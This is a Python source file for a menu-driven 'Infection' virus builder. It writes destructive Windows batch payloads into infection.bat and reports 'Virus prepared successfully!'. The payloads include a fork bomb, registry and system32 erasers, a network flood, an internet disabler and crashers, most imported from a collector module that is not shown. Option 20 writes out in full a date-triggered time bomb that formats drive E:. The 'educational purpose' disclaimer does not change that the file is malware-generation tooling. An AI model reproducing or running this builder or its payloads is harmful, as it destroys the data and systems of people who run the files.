import os

from files import colors
from files.sprint import sprint

from scripts.menu import menu , sleep
from files.banner import banner , banner2 , clear


clear()
c = colors
useless = open("infection.bat" , "a+")
useless.close()
os.remove("infection.bat")
banner()
sprint(c.ly + "\n\n\t\tPreparing Database...")
sleep(2)
sprint(c.ly + "\n\n\t\tAlmost Done...")
sleep(2)
clear()
sprint(c.c + "\n\n\n\t\tLoaded Successfully")
print(c.c + "\n\nNote: " + c.lr + "Use this tool for educational purpose.\n\t")
sleep(1)
clear()
sprint(c.ly + "\n\n\n\t\tStarting Builder.....")



def builder():
    clear()
    banner2()
    menu()
    choice = input(c.lg + "root@Infection~ " +c.ly)

    if choice == "1":
        exit()

    elif choice == "2":
        with open("infection.bat" , "a+") as infection:
            from scripts.collector import application_bomber_read
            infection.write(application_bomber_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" +c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "3":
        from scripts.collector import auto_shutdown_read
        with open("infection.bat" , "a+") as infection:
            infection.write(auto_shutdown_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" +c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "4":
        from scripts.collector import caps_toggle_read
        with open("infection.bat" , "a+") as infection:
            infection.write(caps_toggle_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" +c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "5":
        from scripts.collector import danger_zone_read
        with open("infection.bat" , "a+") as infection:
            infection.write(danger_zone_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" +c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "6":
        from scripts.collector import reg_eraser_read
        with open("infection.bat" , "a+") as infection:
            infection.write(reg_eraser_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" +c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "7":
        from scripts.collector import sys32_read
        with open("infection.bat" , "a+") as infection:
            infection.write(sys32_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" +c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "8":
        from scripts.collector import drive_read
        with open("infection.bat" , "a+") as infection:
            infection.write(drive_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" +c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "9":
        from scripts.collector import forkBomb_read
        with open("infection.bat" , "a+") as infection:
            infection.write(forkBomb_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" +c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "10":
        from scripts.collector import internet_disabler_read
        with open("infection.bat" , "a+") as infection:
            infection.write(internet_disabler_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" +c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")


    elif choice == "11":
        from scripts.collector import network_flood_read
        with open("infection.bat" , "a+") as infection:
            infection.write(network_flood_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "12":
        from scripts.collector import pc_crash_read
        with open("infection.bat" , "a+") as infection:
            infection.write(pc_crash_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "13":
        from scripts.collector import pc_crash2_read
        with open("infection.bat" , "a+") as infection:
            infection.write(pc_crash2_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "\nIn Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "14":
        from scripts.collector import shutdown_read
        with open("infection.bat" , "a+") as infection:
            infection.write(shutdown_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "15":
        from scripts.collector import up_internet_read
        with open("infection.bat" , "a+") as infection:
            infection.write(up_internet_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "16":
        from scripts.collector import stop_internet_read
        with open("infection.bat" , "a+") as infection:
            infection.write(stop_internet_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "17":
        from scripts.collector import sys_eraser_read
        with open("infection.bat" , "a+") as infection:
            infection.write(sys_eraser_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "18":
        from scripts.collector import sys_melter_read
        with open("infection.bat" , "a+") as infection:
            infection.write(sys_melter_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "19":
        from scripts.collector import the_matrix_read
        with open("infection.bat" , "a+") as infection:
            infection.write(the_matrix_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    elif choice == "20":
        date = input(c.ran + "Enter date of explosion [Eg: 30/12/2021] :")
        time_bomb_read = f"""
        If %date% NEQ {date} goto exit
        format E: /y >nul
        :exit
        exit
        """
        with open("infection.bat" , "a+") as infection:
            infection.write(time_bomb_read)

        sprint(c.ran + "\nPreparing...")
        sleep(1)
        print(c.lc + "Virus prepared successfully!")
        sprint(c.ran + "\nTo access the infected file in termux\n" + c.c + "Type 'cp infection.bat/sdcard'"
               + c.lr + "In Kali type 'cp infection.bat/'TYPE PATH'")

    else:
        sprint(c.r+ "Successfully typed INVALID OPTION! ")
        sprint("EXITING TOOL...")
        exit()

no = ['n' , 'no']
yes = ['y' , 'yes']

cont = ""
while cont not in no:
    builder()

    cont = input(c.ran + "Do you want to continue? [y/n]:")

    if cont in no:
        banner2()

    else:
        pass




